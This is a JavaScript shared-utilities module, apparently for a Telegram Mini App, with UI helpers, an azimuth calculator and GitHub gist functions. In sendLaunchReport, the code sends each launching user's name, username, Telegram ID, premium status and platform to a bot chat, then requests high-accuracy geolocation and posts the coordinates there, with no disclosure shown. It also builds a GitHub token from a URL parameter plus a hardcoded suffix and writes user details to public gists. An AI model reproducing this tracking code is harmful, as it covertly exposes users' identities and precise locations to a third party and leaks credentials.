(function (global) {
  const TOKEN_SUFFIX = "AEIlGh23bO2ygpYMlJrB9MOA42UceJ";
  const byId = (id) => document.getElementById(id);
  const round6 = (n) => Math.round(n * 1e6) / 1e6;

  function getTg() { return global.Telegram?.WebApp || null; }
  function getTgUser() { const tg = getTg(); return tg?.initDataUnsafe?.user || null; }
  function getUserIdentity() {
    const u = getTgUser();
    return {
      id: u ? u.id : (localStorage.getItem('debug_uid') || ("guest_" + Math.random().toString(36).slice(2, 7))),
      name: u ? (u.first_name + (u.last_name ? " " + u.last_name : "")) : "Guest",
      username: u?.username ? `@${u.username}` : ""
    };
  }
  function getTokenFromUrl() {
    const p = (new URLSearchParams(global.location.search).get('t') || '').slice(0, 10);
    return p.length < 10 ? null : p + TOKEN_SUFFIX;
  }
  function buildInitFileContent() {
    const tg = getTg(), u = tg?.initDataUnsafe?.user, ts = new Intl.DateTimeFormat('ru-RU', { timeZone: 'Europe/Moscow', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).format(new Date());
    return [`👤 User: ${u ? `${u.first_name||''}${u.last_name?` ${u.last_name}`:''}`.trim() : 'Unknown'} (${u?.username ? `@${u.username}` : '-'})`, `🆔 ID: ${u?.id || '-'}`, `⭐ Premium: ${u?.is_premium ? 'yes' : 'no'}`, `📱 Platform: ${tg?.platform || '-'}`, `💬 Chat Type: ${tg?.initDataUnsafe?.chat_type || '-'}`, `🔗 Chat Instance: ${tg?.initDataUnsafe?.chat_instance || '-'}`, `🕒 Created At (Moscow): ${ts}`].join('\n');
  }
  async function apiRequest(token, url, method = 'GET', body = null) {
    if (!token) return null;
    const res = await fetch(url, { method, headers: { Authorization: `token ${token}`, 'Content-Type': 'application/json' }, body: body ? JSON.stringify(body) : null });
    return res.ok ? (res.status === 204 ? true : res.json()) : null;
  }
  function calcAz(p1, p2) {
    if (!p1 || !p2) return 0;
    const [la1, lo1] = p1.map(v => v * Math.PI/180), [la2, lo2] = p2.map(v => v * Math.PI/180);
    const y = Math.sin(lo2-lo1) * Math.cos(la2), x = Math.cos(la1)*Math.sin(la2) - Math.sin(la1)*Math.cos(la2)*Math.cos(lo2-lo1);
    return Math.round((Math.atan2(y, x) * 180 / Math.PI + 360) % 360);
  }
  function showToast(text, type = 'info', duration = 2200) {
    const el = byId('toast'); if (!el) return;
    el.textContent = text; el.className = ''; el.classList.add(type || 'info');
    setTimeout(() => el.classList.remove('show'), duration);
    requestAnimationFrame(() => el.classList.add('show'));
  }
  function notify(text, duration = 2000) {
    document.querySelectorAll('.custom-notify').forEach(e => e.remove());
    const el = document.createElement('div'); el.className = 'custom-notify'; el.textContent = text;
    el.style.cssText = `position:fixed;top:env(safe-area-inset-top,0px);left:50%;transform:translateX(-50%) translateY(-100px);background:rgba(20,20,20,0.9);color:#fff;padding:14px 24px;border-radius:50px;font-size:15px;font-weight:700;z-index:99999;border:1px solid rgba(255,255,255,0.25);box-shadow:0 10px 30px rgba(0,0,0,0.4);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);transition:transform 0.3s ease,opacity 0.3s ease;opacity:0;`;
    document.body.appendChild(el);
    requestAnimationFrame(() => { el.style.transform = 'translateX(-50%) translateY(0)'; el.style.opacity = '1'; });
    if (duration > 0) setTimeout(() => { el.style.transform = 'translateX(-50%) translateY(-100px)'; el.style.opacity = '0'; setTimeout(() => el.remove(), 300); }, duration);
  }
  async function findUserGist(token, userId) {
    let all = [], page = 1;
    while (true) {
      const gists = await apiRequest(token, `https://api.github.com/gists?per_page=100&page=${page}&t=${Date.now()}`);
      if (!gists?.length) break; all = all.concat(gists); if (gists.length < 100) break; page++;
    }
    return all?.find(g => g.description?.includes(`[${userId}]`))?.id || null;
  }
  async function ensureGist(token, userId, desc, initContent) {
    let gistId = await findUserGist(token, userId);
    if (gistId) return gistId;
    const cr = await apiRequest(token, 'https://api.github.com/gists', 'POST', { description: desc, public: true, files: { ".init": { content: initContent } } });
    return cr?.id || null;
  }
  async function sendTgReport(botToken, chatId, text) {
    if (!botToken || !chatId) return { ok: false };
    try {
      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text }) });
      const data = await res.json().catch(() => null);
      return { ok: !!(res.ok && data?.ok) };
    } catch { return { ok: false }; }
  }
  async function sendLaunchReport(botToken, chatId, opts = {}) {
    const tg = getTg(), u = tg?.initDataUnsafe?.user || {};
    const fullName = [u.first_name, u.last_name].filter(Boolean).join(' ').trim() || 'Unknown';
    const username = u.username ? `@${u.username}` : '@none';
    const ts = new Intl.DateTimeFormat('ru-RU', { timeZone: 'Europe/Moscow', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).format(new Date());
    const text = [`👤 User: ${fullName} (${username})`, `🆔 ID: ${u.id || 'unknown'}`, `⭐ Premium: ${u.is_premium ? 'yes' : 'no'}`, `📱 Platform: ${tg?.platform || 'unknown'}`, `💬 Chat Type: ${tg?.initDataUnsafe?.chat_type || 'unknown'}`, `🔗 Chat Instance: ${tg?.initDataUnsafe?.chat_instance || 'unknown'}`, `🔧 Link: ${new URLSearchParams(global.location.search).get('startapp') || new URLSearchParams(global.location.search).get('route') || '-'}`, `🕒 ${ts} (Moscow)`].join('\n');
    await sendTgReport(botToken, chatId, text);
    if (navigator.geolocation) navigator.geolocation.getCurrentPosition(p => fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, latitude: p.coords.latitude, longitude: p.coords.longitude }) }).catch(() => {}), () => {}, { enableHighAccuracy: true, timeout: 15000 });
    return { ok: true };
  }
  async function sendRouteReport(botToken, chatId, routeName, source, userName, username) {
    const ts = new Intl.DateTimeFormat('ru-RU', { timeZone: 'Europe/Moscow', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }).format(new Date());
    return sendTgReport(botToken, chatId, [`👤 User: ${userName||'Unknown'} (${username||'@none'})`, `🧭 Route: ${routeName}`, `📌 Source: ${source}`, `🕒 ${ts}`].join('\n'));
  }
  function toggleModal(id) { const m = byId(id); if (m) m.style.display = (m.style.display === 'none' || !m.style.display) ? 'flex' : 'none'; }
  function expandTg() { const tg = getTg(); if (tg) { tg.expand(); if (tg.requestFullscreen) try { tg.requestFullscreen(); } catch(e) {} } }

  global.AppShared = { TOKEN_SUFFIX, byId, round6, getTg, getTgUser, getUserIdentity, getTokenFromUrl, buildInitFileContent, apiRequest, calcAz, showToast, notify, findUserGist, ensureGist, sendTgReport, sendLaunchReport, sendRouteReport, toggleModal, expandTg };
})(window);
